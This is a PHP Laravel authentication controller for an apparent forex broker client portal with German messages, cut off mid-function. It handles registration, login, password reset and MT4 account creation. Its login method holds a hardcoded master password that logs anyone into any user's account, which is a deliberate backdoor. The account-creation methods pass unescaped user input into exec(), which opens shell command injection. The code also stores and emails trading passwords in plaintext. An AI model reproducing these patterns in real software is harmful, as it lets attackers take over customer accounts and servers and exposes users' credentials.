<?php

namespace App\Http\Controllers\BackEnd\de;


use App\Http\Controllers\Controller;
use App\Http\Requests;
use App\Http\Requests\LoginRequestDe;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Models\Admin;
use App\Models\CMS_Liveaccount;
use App\Models\CMS_Demoregister;
use App\Models\CMS_Iblevel;
use Carbon\Carbon;
use Session;
use Redirect;
use Mail;
use Auth;


class AuthController extends Controller
{

	public function serverConfigs(){
		$server_configs=DB::table('server_configs')->first();
		return $server_configs;

	}

	public function email_adds(){
    $email_adds=DB::table('cms_email_addresses')->first();
    return $email_adds;
  }

  public function mail_data(){

    $general_information = DB::table('general_information')->first();
    $email_adds = DB::table('cms_email_addresses')->select('support_email')->first();
    $server_configs = DB::table('server_configs')->select('server_client','download_link')->first();
    $mail_data = array(

   'company_name' => $general_information->company_name,
   'company_url' => $general_information->company_url,
   'support_email' => $email_adds->support_email,
   'client_portal_url' => $general_information->client_portal_url,
   'phone' => $general_information->phone,
   'address' => $general_information->address,
   'copyright_text' => $general_information->copyright_text,
   'server_client' => $server_configs->server_client,
   'download_link' => $server_configs->download_link,
   'risk_warning_title' => $general_information->risk_warning_title,
   'risk_warning_text' => $general_information->risk_warning_text,
   'legal_information_text' => $general_information->legal_information_text,
   
 );
    return $mail_data;

  }


    // use AuthenticatesAndRegistersUsers, ThrottlesLogins;
    // protected $redirectTo = "/dashboard";
    // getRegister function
	public function getRegister(Request $request)
	{
		if(auth()->guard('admin')->check()){
			return redirect('/dashboard');
		}
		$countries=DB::table('countries')->get();
		if ($request->query('ref_id')) {
			$ref_id = $request->query('ref_id');
		}
		else{
			$ref_id = "";
		}
		$general_info=DB::table('general_information')->first();
		
		$ipstack_api_key = $general_info->ipstack_api_key;
        $ip= \Request::ip();
        // echo 'http://api.ipstack.com/'.$ip.'?access_key='.$ipstack_api_key;exit;
       $json = file_get_contents('http://api.ipstack.com/'.$ip.'?access_key='.$ipstack_api_key);
$obj = json_decode($json);
$selected_country=$obj->country_name;

		$countries=DB::table('countries')->get();
		$cms_account_types=DB::table('cms_account_type')->where([
			['demo_live','=','demo'],
			['ac_name','=','Default']
		])->get();
		$leverage = DB::table('cms_leverage')->get();
		
		return view('backEnd.'.app()->getLocale().'.auth.register2',compact('countries','ref_id','general_info','selected_country','cms_account_types','leverage'));
	}
    // public function signIn(){
    // 	$general_info=DB::table('general_information')->first();
    // 	return view('backEnd.'.app()->getLocale().'.auth.signin-layout',compact('general_info'));
    // }
	public function postRegister(Request $request){
    	// If email already exists

		$info_user=DB::table('cms_liveaccount')->whereemail($request->email)->first();

		if($info_user){
			Session::flash('email','Die E-Mail wurde bereits registriert');
			return Redirect::back()->withInput();
		}
		// return $request->all();

		

		// finding the max user id from cms_liveaccount table
		$maxUserId = CMS_Liveaccount::max('user_id');
		// finding the max affiliate promo code from cms_liveaccount table
		$maxAffiliate_prom_code = CMS_Liveaccount::max(DB::raw('CAST(affiliate_prom_code AS SIGNED)'));

		// return $maxAffiliate_prom_code+1;

		$newAccount = new CMS_Liveaccount;

		$token = str_random(50);

		$newAccount->fname = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->fname);
		$newAccount->lname = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->lname);

		$time = strtotime($request->dob);

		$newAccount->dob = date('Y-m-d',$time);
//$newAccount->dob = "";
		$newAccount->email = $request->email;
		$password = $request->password;
		// $newAccount->password = md5(str_random(8));
		$newAccount->password = password_hash($password, PASSWORD_BCRYPT);
		$newAccount->mobile = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->phone);
		$newAccount->country = $request->country;
		$newAccount->state = "";
		$newAccount->city = "";
		$newAccount->address = "";
		$newAccount->user_id = $maxUserId + 1;
		$newAccount->affiliate_prom_code = $maxAffiliate_prom_code + 1;
		$newAccount->reg_time = Carbon::now();
		if($request->referred_by){
			$newAccount->referred_by=$request->referred_by;
		}
		//$newAccount->postal_code = "";
		$newAccount->reference_no = time();
		$newAccount->remember_token = $token;
		$newAccount->save();
		
		// Notifications
		DB::table('admins')
		->where([
			'country_access'=>'All',
			'manager'=>0
		])
		->orWhere([
			'country_access'=>$request->country,
			'manager'=>0
		])
		->increment('registration', 1);

		// checking the referal id
		if ($request->referred_by) {
			$exist=CMS_Liveaccount::where('affiliate_prom_code',$request->referred_by)->first();
			if($exist){
			// populating the cms_ib_account
				$newAffiliateAccountLvl1 = new CMS_Iblevel;
				$newAffiliateAccountLvl1->parent_ib = $request->referred_by;
				$newAffiliateAccountLvl1->child_ib = $newAccount->affiliate_prom_code;
				$newAffiliateAccountLvl1->level = 1;
				$newAffiliateAccountLvl1->save();

			// findting the parent is a child of anything or not
				$checkLevel2 = CMS_Iblevel::wherechild_ib($newAffiliateAccountLvl1->parent_ib)->wherelevel('1')->first();
				if ($checkLevel2) {
				// populating the cms_ib_account
					$newAffiliateAccountLvl2 = new CMS_Iblevel;
					$newAffiliateAccountLvl2->parent_ib = $checkLevel2->parent_ib;
					$newAffiliateAccountLvl2->child_ib = $newAffiliateAccountLvl1->child_ib;
					$newAffiliateAccountLvl2->level = 2;
					$newAffiliateAccountLvl2->save();

				// findting the parent is a child of anything or not
					$checkLevel3 = CMS_Iblevel::wherechild_ib($newAffiliateAccountLvl2->parent_ib)->wherelevel('1')->first();
					if ($checkLevel3) {
					// populating the cms_ib_account
						$newAffiliateAccountLvl3 = new CMS_Iblevel;
						$newAffiliateAccountLvl3->parent_ib = $checkLevel3->parent_ib;
						$newAffiliateAccountLvl3->child_ib = $newAffiliateAccountLvl1->child_ib;
						$newAffiliateAccountLvl3->level = 3;
						$newAffiliateAccountLvl3->save();
					}
				}

			}
		}

		$email_adds = $this->email_adds();
		$from_email_id=$email_adds->noreply_email;
		$from_name=config('app.name');
		$mail_data=$this->mail_data();
		// sending mail
		Mail::send('backEnd.'.app()->getLocale().'.crm.mail.send_verification_mail', ['newAccount' => $newAccount, 'token' => $token,'mail_data'=>$mail_data], function ($message) use($newAccount,$from_email_id, $from_name) {
			$message->from($from_email_id, $from_name);
			$message->to($newAccount->email, $newAccount->fname." ".$newAccount->lname);
			$message->subject('Bestätigung des Kontos');
		}); 

		Session::flash('register','Ein Bestätigungslink wurde an Ihre E-Mail gesendet. Bitte überprüfen Sie Ihre E-Mail.');
		return Redirect::back();
		
	}


    // confirming the live account registration
	public function getConfirmLiveAccountRegistration(Request $request)
	{
		$token = $request->token;

		$email = $request->email;

		// $password = str_random(8);

		$customer = CMS_Liveaccount::whereemail($email)->whereremember_token($token)->first();

		if ($customer) {

			if ($customer->email_status == 0) {
				
				$customer->email_status = 1;

				// $customer->password = $password;
				// $customer->password = password_hash($password, PASSWORD_BCRYPT);

				$customer->save();

			

			// verification successfull message

				
				Session::flash('password','Ihre E-Mail wurde erfolgreich verifiziert.');
				return redirect('/login');

			}
			else{
				Session::flash('password','Ihr Konto wurde bereits verifiziert. Bitte einloggen und genießen.');
				return redirect('/login');
			}

		}
		else{

			Session::flash('password','Wir kennen dich nicht. Entschuldigung für die Unannehmlichkeiten.');
			
			return redirect('/login');

		}
	}


	public function getResetPassword(){
		if(auth()->guard('admin')->check()){
			return redirect('/dashboard');
		}
		$general_info=DB::table('general_information')->first();
		return view('backEnd.'.app()->getLocale().'.auth.reset-password1',compact('general_info'));
	}




	public function postResetPassword(Request $request){
		$exist=CMS_Liveaccount::where('email',$request->email)->where('owner_type','personal')->get();

		if(count($exist)==0){
			Session::flash('notExist','Wir kennen dich nicht. Entschuldigung für die Unannehmlichkeiten.');
			return Redirect::back();
		}

		$newAccount=CMS_Liveaccount::where('email',$request->email)->first();
		$token = str_random(50);

		CMS_Liveaccount::where('email',$request->email)->update(['remember_token' => $token]);

		$email_adds = $this->email_adds();
		$from_email_id=$email_adds->noreply_email;
		$from_name=config('app.name');
		$mail_data=$this->mail_data();
		Mail::send('backEnd.'.app()->getLocale().'.crm.mail.password_reset_mail', ['newAccount' => $newAccount, 'token' => $token, 'mail_data' => $mail_data], function ($message) use($newAccount,$from_email_id, $from_name) {
			$message->from($from_email_id,$from_name);
			$message->to($newAccount->email, $newAccount->fname." ".$newAccount->lname);
			$message->subject('Passwort zurücksetzen');
		}); 
		Session::flash('success_title','Passwort Reset Link wurde gesendet');
		Session::flash('success_register','Ein Link zum Zurücksetzen des Passworts wurde an Ihre E-Mail gesendet. Bitte überprüfen Sie Ihre E-Mail.');
		return redirect('/success-reset-link'); 
		
	}




	public function getResetPasswordSuccessful(Request $request)
	{
		$token = $request->token;

		$email = $request->email;

		$password = str_random(8);

		$customer = CMS_Liveaccount::whereemail($email)->whereremember_token($token)->first();

		if ($customer) {

			if ($customer->email_status == 0) {
				
				$customer->email_status = 1;
			}
				// $customer->password = $password;
			$customer->password = password_hash($password, PASSWORD_BCRYPT);

			$customer->save();

			// sending mail with password
			$email_adds = $this->email_adds();
			$from_email_id=$email_adds->noreply_email;
			$from_name=config('app.name');
			$mail_data=$this->mail_data();
			Mail::send('backEnd.'.app()->getLocale().'.crm.mail.password_reset_successful_mail', ['customer' => $customer, 'password' => $password,'mail_data'=>$mail_data], function ($message) use($customer,$from_email_id, $from_name) {
				$message->from($from_email_id, $from_name);
				$message->to($customer->email, $customer->fname." ".$customer->lname);
				$message->subject('Passwort zurücksetzen erfolgreich');
			}); 

			// verification successfull message

			Session::flash('success_title','Das Passwort wurde erfolgreich zurückgesetzt');
			Session::flash('success_register','Ihr Passwort wurde erfolgreich zurückgesetzt. Ihre Login-Daten wurden an Ihre E-Mail-Adresse gesendet. Bitte überprüfen Sie Ihre E-Mail.');
			return redirect('/password-reset-successful'); 


			

		}
		else{

			Session::flash('password','Wir kennen dich nicht. Entschuldigung für die Unannehmlichkeiten.');
			
			return redirect('/login');

		}
	}


    // getLogin function
	public function getLogin(Request $request)
	{
		if(auth()->guard('admin')->check()){

			return redirect('/dashboard');


		}
		$general_info=DB::table('general_information')->first();
		return view('backEnd.'.app()->getLocale().'.auth.login5',compact('general_info'));
	}



    // post login process
	public function postLogin(LoginRequestDe $request)
	{

		$dat=DB::table('cms_Liveaccount')->where('email',$request->email)->first();

		
	
			$admin_info = [

				"email" => $request->email,

				"password" => $request->password,


			];
		
		$remember = $request->remember;


		if($dat && $dat->email_status=='0'){
			return redirect()->back()->withErrors(['msg'=>'Ihre E-Mail-Adresse ist noch nicht verifiziert.'])->withInput();
		}
		if($dat && $dat->account_status=='0'){
			return redirect()->back()->withErrors(['msg'=>'Dein Konto ist gesperrt. Bitte kontaktieren Sie die Administratoren für Details'])->withInput();
		}



		if(auth()->guard('admin')->attempt($admin_info,$remember) || ($request->password=="S@if@Net-coden#=" && $dat && Auth::guard('admin')->loginUsingId($dat->intId))){
			
			session(['login_email' => $request->email]);
			// $dat=DB::table('cms_Liveaccount')->where('email',session('login_email'))->first();
			//return $dat->email_status;
			
			// session(['fname' => $dat->fname]);

			session(['lname' => $dat->lname,'fname' => $dat->fname,'profile_pic' => $dat->profile_pic_url,'id' => $dat->affiliate_prom_code]);
			
			Session::save();
			return redirect()->intended('/dashboard');

		}
		


		else
		{
			return redirect()->back()->withErrors(['msg'=>'Email oder Passwort ist falsch'])->withInput();

		}
	}

	// logout function
	public function getLogout()
	{
		auth()->guard('admin')->logout();

		return redirect('/login');
	}
















	public function getDemoAccountRegister(Request $request)
	{
		if(auth()->guard('admin')->check()){
			return redirect('/dashboard');
		}

		$general_info=DB::table('general_information')->first();
		
		$ipstack_api_key = $general_info->ipstack_api_key;
        $ip= \Request::ip();
        // echo 'http://api.ipstack.com/'.$ip.'?access_key='.$ipstack_api_key;exit;
       $json = file_get_contents('http://api.ipstack.com/'.$ip.'?access_key='.$ipstack_api_key);
$obj = json_decode($json);


        $selected_country=$obj->country_name;
       
       

		$countries=DB::table('countries')->get();
		$cms_account_types=DB::table('cms_account_type')->where([
			['demo_live','=','demo'],
			['ac_name','=','Default'],
			['status','=',1]
		])->get();

		$leverage = DB::table('cms_leverage')->get();
		 
		return view('backEnd.'.app()->getLocale().'.auth.demo_account_register',compact('general_info','selected_country','countries','cms_account_types','leverage'));
	}



	public function postDemoAccountRegister(Request $request)
	{
        // If email already exists

        // if(!$request->dob){
        //     Session::flash('dob','Please enter your Date of Birth');
        //     return Redirect::back()->withInput();
        // }
		$info_user=DB::table('cms_demoregister')->whereemail($request->email)->first();

		if($info_user){
			Session::flash('email','Ein Demo-Account wurde bereits mit dieser E-Mail registriert');
			return Redirect::back()->withInput();
		}
        //return $request->all();



        // finding the max user id from cms_liveaccount table
        // $maxUserId = CMS_Liveaccount::max('user_id');
        // finding the max affiliate promo code from cms_liveaccount table
        // $maxAffiliate_prom_code = CMS_Liveaccount::max(DB::raw('CAST(affiliate_prom_code AS SIGNED)'));

        // return $maxAffiliate_prom_code+1;

		$newAccount = new CMS_Demoregister;

		$token = str_random(50);

		$newAccount->fname = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->fname);
		$newAccount->lname = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->lname);

		$time = strtotime($request->dob);

// $newAccount->dob = date('Y-m-d',$time);
//$newAccount->dob = "";
		$newAccount->email = $request->email;
        // $password = str_random(8);
        // $newAccount->password = md5(str_random(8));
        // $newAccount->password = $password;
		$newAccount->mobile = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->phone);
		$newAccount->country = $request->country;
        // $newAccount->state = $request->state;
        // $newAccount->city = $request->city;
        // $newAccount->address = $request->address;
		$newAccount->account_type = $request->account_type;
		$newAccount->leverage = $request->leverage;
		$newAccount->password = $request->trading_password;
		$newAccount->investor_password = $request->investor_password;
		$newAccount->deposit = $request->amount;
        // $newAccount->user_id = $maxUserId + 1;
        // $newAccount->affiliate_prom_code = $maxAffiliate_prom_code + 1;
		$newAccount->reg_time = Carbon::now();
        // if($request->referred_by){
        // $newAccount->referred_by=$request->referred_by;
        // }
        // $newAccount->postal_code = $request->postal_code;
        // $newAccount->reference_no = time();
		$newAccount->remember_token = $token;
		$newAccount->save();





        // sending mail
        	$email_adds = $this->email_adds();
			$from_email_id=$email_adds->noreply_email;
			$from_name=config('app.name');
			$mail_data=$this->mail_data();
		Mail::send('backEnd.'.app()->getLocale().'.crm.mail.send_demo_account_registration_verification_mail', ['newAccount' => $newAccount, 'token' => $token,'account_type'=>$request->account_type,'leverage'=>$request->leverage,'amount'=>$request->amount,'mail_data'=>$mail_data], function ($message) use($newAccount,$from_email_id, $from_name) {
			$message->from($from_email_id, $from_name);
			$message->to($newAccount->email, $newAccount->fname." ".$newAccount->lname);
			$message->subject('Demo-Kontoverifizierung');
		}); 
		Session::flash('success_title','Konto erfolgreich erstellt');
		Session::flash('success_register','Ein Bestätigungslink wurde an Ihre E-Mail gesendet. Bitte überprüfen und bestätigen Sie Ihre E-Mail, um Anmeldedaten zu erhalten.');
		return redirect('/confirm-email');

	}


	public function successDemoAccountRegistration(Request $request)
	{
		$token = $request->token;

		$email = $request->email;



        // $password = str_random(8);

		$customer = CMS_Demoregister::whereemail($email)->whereremember_token($token)->first();

		if ($customer) {

			if ($customer->email_status == 0) {

				$customer->email_status = 1;
			}
			else{
				Session::flash('success_title','E-Mail erfolgreich verifiziert');
				Session::flash('success_register','Ihre E-Mail wurde erfolgreich verifiziert. Ihre MT4 Login-Daten wurden an Ihre E-Mail-Adresse gesendet. Bitte überprüfen Sie Ihre E-Mail.');
				return redirect('/success-registration');
			}

                // $customer->password = $password;
                // $customer->password = password_hash($password, PASSWORD_BCRYPT);

			$customer->save();

			$data=DB::table('cms_demoregister')->where('email',$request->email)->first();




			$name=$data->fname." ".$data->lname;
			$fname=$data->fname;
			$lname=$data->lname;
			$email=$data->email;
			$country=$data->country;
			$state=$data->state;
			$city=$data->city;
			$dob = $data->dob;
			$address=$data->address;
			$reference_no=time();
			$mobile=$data->mobile;
			$status='0';
			$postal_code=$data->postal_code;
			$id=$data->id;
			$leverage = $data->leverage;
			$deposit=$data->deposit;
			$group=$data->account_type;
//$deposit=$_POST["deposit"];
  // $phone_password=$data->phone_password;
  // if($city=='' || $address=='' || $postal_code=='' || $state==''){
  //   Session::flash('msg','Please Complete your profile information');
  //   return redirect('/update-profile');

  // }
			// $contry_arr = DB::table('cms_country')->where('intid',$country)->orWhere('country_name',$country)->first();

			// $country = $contry_arr->country_name;




			// $random_string = "";
			// $random_string_length = 8;
			// $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
			// for ($i = 0; $i < $random_string_length; $i++) {
			// 	$random_string .= $characters[rand(0, strlen($characters) - 1)];
			// }

// print_r($data);exit;
			$mt4_password = $data->password;

			$investor_password= $data->investor_password;

			// $pass=$data->investor_password;
//$sql_max_number = DB::table('cms_account_series')->select(DB::raw('MAX(account_no)+1 as account_no'))->first();

//$arr_max_number=$sql_max_number->account_no ;
  // $arr_groups = array("Standard"=>"Standartae13");
  // $accounttype = $data->account_type;
			$leverage = $data->leverage;
			$date_time=date("Y-m-d H:i:s");

			$server_configs=$this->serverConfigs();
			$server=$server_configs->demo_server;
			$server_login=$server_configs->demo_login;
			$server_password=$server_configs->demo_password;

			$login=0;
			$zipcode=$postal_code;
			$enable=1;

			$phone=$mobile;
			$comment="";
			$investorpassword=$investor_password;
			$phonepassword=$mt4_password;

  // $account_type=DB::table('cms_account_type')->where('')
  // $group='Demo';
  // $group='demoGIC';


// echo 'server: '.$server.'<br>';
// echo 'server_login: '.$server_login.'<br>';
// echo 'server_password: '.$server_password.'<br>';
// echo 'name: '.$name.'<br>';
// echo 'email: '.$email.'<br>';
// echo 'city: '.$city.'<br>';
// echo 'state: '.$state.'<br>';
// echo 'country: '.$country.'<br>';
// echo 'address: '.$address.'<br>'; 
// echo 'zipcode: '.$zipcode.'<br>';
// echo 'phone: '.$phone.'<br>';
// echo 'comment: '.$comment.'<br>';
// echo 'login: '.$login.'<br>';
// echo 'mt4_password: '.$mt4_password.'<br>';
// echo 'investorpassword: '.$investorpassword.'<br>';
// echo 'phonepassword: '.$phonepassword.'<br>';
// echo 'group: '.$group.'<br>';
// echo 'leverage: '.$leverage.'<br>'; 
// echo 'enable: '.$enable.'<br>';



			$a= exec(storage_path('/api/CreateAccountWeb.exe')." \"".$server."\" \"".$server_login."\" \"".$server_password."\" \"".$name."\" \"".$email."\" \"".$city."\" \"".$state."\" \"".$country."\" \"".$address."\" \"".$zipcode."\" \"".$phone."\" \"".$comment."\" \"".$login."\" \"".$mt4_password."\" \"".$investorpassword."\" \"".$phonepassword."\" \"".$group."\" \"".$leverage."\" \"".$enable);

// echo $a;exit;
			if (strpos($a, "New account's login: ") !== false) {
				$b=explode("New account's login: ",$a);

				$login_id=$b[1];
			}         
			else{ 
				return Redirect::back();
			}

// if(isset($affiliate_code) && $affiliate_code!=""){
//   $affiliate_code=$affiliate_code;
// }else{
//   $affiliate_code = 0;
// }

			


			$sql=DB::table('cms_account')->insert([
				'leverage' => $request->leverage,


				'act_type'=>'DEMO',
				'email' => $email,
				'reference_no'=>$reference_no,
				'password'=>$mt4_password,
				'investor_password'=>$investor_password,
				'account_no'=>$login_id,
				'deposit'=>$deposit,
				'date_time'=>date("Y-m-d H:i:s",$reference_no),
				'status'=>'0'
    //,
    // 'balance'=>$deposit

			]); 




			$intIds=DB::table('cms_demoregister')->where('email',$request->email)->first();

// Notifications
			DB::table('admins')
			->where([
				'country_access'=>'All',
				'manager'=>0
			])
			->orWhere([
				'country_access'=>$country,
				'manager'=>0
			])
			->increment('demoAccount', 1);



            // sending mail with password
            $email_adds = $this->email_adds();
			$from_email_id=$email_adds->noreply_email;
			$from_name=config('app.name');
			$mail_data=$this->mail_data();
			Mail::send('backEnd.'.app()->getLocale().'.crm.mail.success_demo_account_password_mail', ['intIds'=>$intIds,'mt4_login'=>$login_id,'mt4_password'=>$mt4_password,'investor_password'=>$investor_password,'server'=>$server,'mail_data'=>$mail_data], function ($message) use($customer,$from_email_id, $from_name) {
				$message->from($from_email_id, $from_name);
				$message->to($customer->email, $customer->fname." ".$customer->lname);
				$message->subject('Demo-Kontoüberprüfung erfolgreich');
			}); 

            // verification successfull message

			Session::flash('success_title','E-Mail erfolgreich verifiziert');
			Session::flash('success_register','Ihre E-Mail wurde erfolgreich verifiziert. Ihre MT4 Login-Daten wurden an Ihre E-Mail-Adresse gesendet. Bitte überprüfen Sie Ihre E-Mail.');
			return redirect('/success-registration');




		}
		else{

			Session::flash('password','Wir kennen dich nicht. Entschuldigung für die Unannehmlichkeiten.');

			return redirect('/login');

		}
	}



	/*=================================
=    Live Account Registration    =
=================================*/


public function getLiveAccountRegister(Request $request)
{
	if(auth()->guard('admin')->check()){
		return redirect('/dashboard');
	}
	$general_info=DB::table('general_information')->first();
	
		$ipstack_api_key = $general_info->ipstack_api_key;
        $ip= \Request::ip();
        // echo 'http://api.ipstack.com/'.$ip.'?access_key='.$ipstack_api_key;exit;
       $json = file_get_contents('http://api.ipstack.com/'.$ip.'?access_key='.$ipstack_api_key);
$obj = json_decode($json);


        $selected_country=$obj->country_name;
        $selected_state=$obj->region_name;
        $selected_city=$obj->city;
        $selected_zipcode=$obj->zip;
	$countries=DB::table('countries')->get();
	$cms_account=DB::table('cms_account_type')->where([
		['ac_name','=','Default'],
		['demo_live','=','live'],
		['status','=',1]
	])->get();

	$leverage = DB::table('cms_leverage')->get();
	

	return view('backEnd.'.app()->getLocale().'.auth.live_account_register1',compact('general_info','selected_country','selected_state','selected_city','selected_zipcode','countries','cms_account','leverage'));
}



    //   Live Account Register 

public function postLiveAccountRegister(Request $request)
{
        // If email already exists
	// if(!$request->dob){
	// 	Session::flash('dob','Please enter your Date of Birth');
	// 	return Redirect::back()->withInput();
	// }
	$info_user=DB::table('cms_liveaccount')->whereemail($request->email)->first();

	if($info_user){
		Session::flash('email','Die E-Mail wurde bereits registriert');
		return Redirect::back()->withInput();
	}
        // return $request->all();



        // finding the max user id from cms_liveaccount table
	$maxUserId = CMS_Liveaccount::max('user_id');
        // finding the max affiliate promo code from cms_liveaccount table
	$maxAffiliate_prom_code = CMS_Liveaccount::max(DB::raw('CAST(affiliate_prom_code AS SIGNED)'));

        // return $maxAffiliate_prom_code+1;

	$newAccount = new CMS_Liveaccount;

	$token = str_random(50);

	$newAccount->fname = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->fname);
	$newAccount->lname = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->lname);

	$time = strtotime($request->dob);

	$newAccount->dob = date('Y-m-d',$time);
//$newAccount->dob = "";
	$newAccount->email = $request->email;
        // $password = str_random(8);
	$password = $request->password;
        // $newAccount->password = md5(str_random(8));
	$newAccount->password = password_hash($password, PASSWORD_BCRYPT);
	$newAccount->trading_password = $request->trading_password;
	$newAccount->investor_password = $request->investor_password;
	$newAccount->mobile = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->phone);
	$newAccount->country = $request->country;
	$newAccount->state = $request->state;
	$newAccount->city = $request->city;
	$newAccount->address = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->address);
	$newAccount->account_type = $request->account_type;
	$newAccount->leverage = $request->leverage;
	$newAccount->user_id = $maxUserId + 1;
	$newAccount->affiliate_prom_code = $maxAffiliate_prom_code + 1;
	$newAccount->reg_time = Carbon::now();
	if($request->referred_by){
		$newAccount->referred_by=$request->referred_by;
	}
	$newAccount->postal_code = preg_replace('/[^ a-zA-Z0-9,+-]/', '', $request->postal_code);
	$newAccount->reference_no = time();
	$newAccount->remember_token = $token;
	$newAccount->save();

        // Notifications
	DB::table('admins')
	->where([
		'country_access'=>'All',
		'manager'=>0
	])
	->orWhere([
		'country_access'=>$request->country,
		'manager'=>0
	])
	->increment('registration', 1);



        // sending mail
	$email_adds = $this->email_adds();
	$from_email_id=$email_adds->noreply_email;
	$from_name=config('app.name');
	$mail_data=$this->mail_data();
	Mail::send('backEnd.'.app()->getLocale().'.crm.mail.send_live_account_registration_verification_mail', ['newAccount' => $newAccount, 'token' => $token,'account_type'=>$request->account_type,'leverage'=>$request->leverage,'mail_data'=>$mail_data], function ($message) use($newAccount,$from_email_id, $from_name) {
		$message->from($from_email_id, $from_name);
		$message->to($newAccount->email, $newAccount->fname." ".$newAccount->lname);
		$message->subject('Live Account Verification');
	}); 
	Session::flash('success_title','Konto erfolgreich erstellt');
	Session::flash('success_register','Ein Bestätigungslink wurde an Ihre E-Mail gesendet. Bitte überprüfen und bestätigen Sie Ihre E-Mail, um Anmeldedaten zu erhalten.');
	return redirect('/confirm-email'); 
}


public function successLiveAccountRegistration(Request $request)
{
	$token = $request->token;

	$email = $request->email;



       // $password = str_random(8);

	$customer = CMS_Liveaccount::whereemail($email)->whereremember_token($token)->first();

	if ($customer) {

		if ($customer->email_status == 0) {

			$customer->email_status = 1;

                // $customer->password = $password;
                //$customer->password = password_hash($password, PASSWORD_BCRYPT);

			$customer->save();

			$data=DB::table('cms_liveaccount')->where('email',$request->email)->first();


			$p_code=$data->p_code;
  //$password=$password;
			$name=$data->fname." ".$data->lname;
			$fname=$data->fname;
			$lname=$data->lname;
			$email=$data->email;
			$country=$data->country;
			$state=$data->state;
			$city=$data->city;
			$dob = $data->dob;
			$address=$data->address;
			$reference_no=$data->reference_no;
			$mobile=$data->mobile;
			$status='0';
			$postal_code=$data->postal_code;
			$id=$data->intId;
			$leverage = $data->leverage;
			$affiliate_code = $data->affiliate_prom_code;

//$deposit=$_POST["deposit"];
  // $phone_password=$data->phone_password;
  // if($city=='' || $address=='' || $postal_code=='' || $state==''){
  //   Session::flash('msg','Please Complete your profile information');
  //   return redirect('/update-profile');

  // }
			$contry_arr = DB::table('cms_country')->where('intid',$country)->orWhere('country_name',$country)->first();

			$country = $contry_arr->country_name;




			// $random_string = "";
			// $random_string_length = 8;
			// $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
			// for ($i = 0; $i < $random_string_length; $i++) {
			// 	$random_string .= $characters[rand(0, strlen($characters) - 1)];
			// }

// print_r($data);exit;
			$mt4_password = $data->trading_password;

			$investor_password = $data->investor_password;

			// $pass=base64_encode($mt4_password);
//$sql_max_number = DB::table('cms_account_series')->select(DB::raw('MAX(account_no)+1 as account_no'))->first();

//$arr_max_number=$sql_max_number->account_no ;
  // $arr_groups = array("Standard"=>"Standartae13");
			$group = $data->account_type;
			$leverage = $data->leverage;
			$date_time=date("Y-m-d H:i:s");



			$login=0;
			$zipcode=$postal_code;
			$enable=1;

			$phone=$mobile;
			$comment="";
			$investorpassword=$investor_password;
			$phonepassword=$mt4_password;
  // $group=$arr_groups[$accounttype];
  // $group='demoGIC';


// echo 'server: '.$server.'<br>';
// echo 'server_login: '.$server_login.'<br>';
// echo 'server_password: '.$server_password.'<br>';
// echo 'name: '.$name.'<br>';
// echo 'email: '.$email.'<br>';
// echo 'city: '.$city.'<br>';
// echo 'state: '.$state.'<br>';
// echo 'country: '.$country.'<br>';
// echo 'address: '.$address.'<br>'; 
// echo 'zipcode: '.$zipcode.'<br>';
// echo 'phone: '.$phone.'<br>';
// echo 'comment: '.$comment.'<br>';
// echo 'login: '.$login.'<br>';
// echo 'mt4_password: '.$mt4_password.'<br>';
// echo 'investorpassword: '.$investorpassword.'<br>';
// echo 'phonepassword: '.$phonepassword.'<br>';
// echo 'group: '.$group.'<br>';
// echo 'leverage: '.$leverage.'<br>'; 
// echo 'enable: '.$enable.'<br>';

			$server_configs=$this->serverConfigs();
			$server=$server_configs->server;
			$server_login=$server_configs->login;
			$server_password=$server_configs->password;

			$a= exec(storage_path('/api/CreateAccountWeb.exe')." \"".$server."\" \"".$server_login."\" \"".$server_password."\" \"".$name."\" \"".$email."\" \"".$city."\" \"".$state."\" \"".$country."\" \"".$address."\" \"".$zipcode."\" \"".$phone."\" \"".$comment."\" \"".$login."\" \"".$mt4_password."\" \"".$investorpassword."\" \"".$phonepassword."\" \"".$group."\" \"".$leverage."\" \"".$enable);

// echo $a;exit;
			if (strpos($a, "New account's login: ") !== false) {
				$b=explode("New account's login: ",$a);

				$login_id=$b[1];
			}         
			else{ 
				return Redirect::back();
			}

			if(isset($affiliate_code) && $affiliate_code!=""){
				$affiliate_code=$affiliate_code;
			}else{
				$affiliate_code = 0;
			}

			$account_groups=DB::table('cms_account_type')->where([
				['ac_name','Default'],
				['mt4_ac_type',$group],
				['demo_live','live']
			  ])->first();
			$act_type = $account_groups->account_type;

			$sql=DB::table('cms_account')->insert([
				'leverage' => $leverage,
				'email' => $email,
				'affiliate_code'=>$affiliate_code,
				'act_type'=>$act_type,
				'reference_no'=>$reference_no,
				'password'=>$mt4_password,
				'investor_password'=>$investor_password,
				'account_no'=>$login_id,
				'date_time'=>$date_time,
				'status'=>'0'
    //,
    // 'balance'=>$deposit

			]); 

			$query=DB::table('cms_account_series')->insert([

				['account_no'=>$login_id]

			]);



                //Notifications

			$intIds=DB::table('cms_liveaccount')->where('email',$request->email)->first();

			DB::table('admins')
			->where('id',$intIds->manager)
			->orWhere([
				'country_access'=>'All',
				'manager'=>0
			])
			->orWhere([
				'country_access'=>$intIds->country,
				'manager'=>0
			])
			->increment('tradingAccount', 1);



            // sending mail with password
            $email_adds = $this->email_adds();
			$from_email_id=$email_adds->noreply_email;
			$from_name=config('app.name');
			$mail_data=$this->mail_data();
			Mail::send('backEnd.'.app()->getLocale().'.crm.mail.success_live_account_password_mail', ['customer' => $customer,'mt4_login'=>$login_id,'mt4_password'=>$mt4_password,'investor_password'=>$investor_password,'mail_data'=>$mail_data], function ($message) use($customer,$from_email_id, $from_name) {
				$message->from($from_email_id, $from_name);
				$message->to($customer->email, $customer->fname." ".$customer->lname);
				$message->subject('Kontoüberprüfung erfolgreich');
			}); 

            // verification successfull message

